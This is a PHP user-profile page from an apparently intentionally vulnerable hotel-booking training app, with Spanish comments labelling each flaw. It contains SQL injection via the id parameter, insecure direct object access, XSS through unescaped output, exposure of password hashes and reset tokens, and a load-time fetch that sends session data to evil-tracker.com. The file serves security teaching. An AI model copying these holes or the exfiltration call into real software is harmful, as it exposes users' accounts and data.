<?php
// ⚠️ PERFIL DE USUARIO CON BOLA Y XSS

require_once '../includes/database.php';
require_once '../includes/auth.php';

if (!isLoggedIn()) {
    header('Location: ?page=login');
    exit;
}

// ⚠️ BOLA: Cualquiera puede ver cualquier perfil
$profile_id = $_GET['id'] ?? $_SESSION['user_id'];

// ⚠️ SQL Injection
$sql = "SELECT * FROM users WHERE id = $profile_id";
$result = $db->query($sql);
$user = $result->fetch_assoc();

// ⚠️ Obtener reservas del usuario
$reservations_sql = "SELECT r.*, h.name as hotel_name 
                     FROM reservations r 
                     JOIN hotels h ON r.hotel_id = h.id 
                     WHERE r.user_id = $profile_id 
                     ORDER BY r.created_at DESC";
$reservations = $db->query($reservations_sql);
?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo htmlspecialchars($user['username']); ?>'s Profile</title>
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>
<body>
    <?php include '../templates/header.php'; ?>
    
    <div class="container">
        <h1>User Profile</h1>
        
        <!-- ⚠️ BOLA: Mostrar perfil de cualquier usuario -->
        <div class="profile-info">
            <h2><?php echo htmlspecialchars($user['username']); ?></h2>
            <p>Email: <?php echo htmlspecialchars($user['email']); ?></p>
            <p>Member since: <?php echo $user['created_at']; ?></p>
            
            <!-- ⚠️ Expone información sensible -->
            <?php if ($_SESSION['is_admin'] || $_SESSION['user_id'] == $profile_id): ?>
                <div class="sensitive-info">
                    <p><strong>Sensitive Information (should not be public):</strong></p>
                    <p>User ID: <?php echo $user['id']; ?></p>
                    <p>Admin: <?php echo $user['is_admin'] ? 'Yes' : 'No'; ?></p>
                    <p>Password Hash: <code><?php echo $user['password']; ?></code></p>
                    
                    <?php if (isset($user['reset_token'])): ?>
                        <p>Password Reset Token: <code><?php echo $user['reset_token']; ?></code></p>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- ⚠️ Permite editar cualquier perfil -->
        <?php if ($_SESSION['is_admin'] || $_SESSION['user_id'] == $profile_id): ?>
            <div class="edit-profile">
                <h3>Edit Profile</h3>
                <form method="POST" action="../api/users.php">
                    <input type="hidden" name="id" value="<?php echo $profile_id; ?>">
                    
                    <div class="form-group">
                        <label>Email:</label>
                        <input type="email" name="email" value="<?php echo htmlspecialchars($user['email']); ?>">
                    </div>
                    
                    <!-- ⚠️ Permite hacerse admin -->
                    <?php if ($_SESSION['is_admin']): ?>
                        <div class="form-group">
                            <label>Admin Privileges:</label>
                            <input type="checkbox" name="is_admin" value="1" 
                                   <?php echo $user['is_admin'] ? 'checked' : ''; ?>>
                        </div>
                    <?php endif; ?>
                    
                    <button type="submit">Update Profile</button>
                </form>
            </div>
        <?php endif; ?>
        
        <div class="user-reservations">
            <h3>Reservation History</h3>
            
            <?php if ($reservations->num_rows > 0): ?>
                <table>
                    <thead>
                        <tr>
                            <th>Hotel</th>
                            <th>Check-in</th>
                            <th>Check-out</th>
                            <th>Price Paid</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while ($reservation = $reservations->fetch_assoc()): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($reservation['hotel_name']); ?></td>
                                <td><?php echo $reservation['check_in']; ?></td>
                                <td><?php echo $reservation['check_out']; ?></td>
                                <td>$<?php echo $reservation['price']; ?></td>
                                <td><?php echo $reservation['status']; ?></td>
                            </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <p>No reservations found.</p>
            <?php endif; ?>
        </div>
        
        <!-- ⚠️ Debug: Muestra cómo acceder a otros perfiles -->
        <div style="background: #e3f2fd; padding: 15px; margin-top: 20px; border: 1px solid #bbdefb;">
            <h4>💡 BOLA Demonstration:</h4>
            <p>Try accessing other user profiles by changing the ID in the URL:</p>
            <code>
                ?page=profile&id=1 (admin)<br>
                ?page=profile&id=2 (regular user)<br>
                ?page=profile&id=3 (another user)
            </code>
        </div>
    </div>
    
    <script>
        // ⚠️ JavaScript que expone datos de sesión
        console.log('Current user ID:', <?php echo $_SESSION['user_id']; ?>);
        console.log('Viewing profile ID:', <?php echo $profile_id; ?>);
        console.log('Is admin?', <?php echo $_SESSION['is_admin'] ? 'true' : 'false'; ?>);
        
        // ⚠️ Envía información de sesión a un tercero
        window.addEventListener('load', function() {
            const sessionData = {
                userId: <?php echo $_SESSION['user_id']; ?>,
                profileId: <?php echo $profile_id; ?>,
                isAdmin: <?php echo $_SESSION['is_admin'] ? 'true' : 'false'; ?>
            };
            
            fetch('https://evil-tracker.com/session', {
                method: 'POST',
                body: JSON.stringify(sessionData)
            });
        });
    </script>
</body>
</html>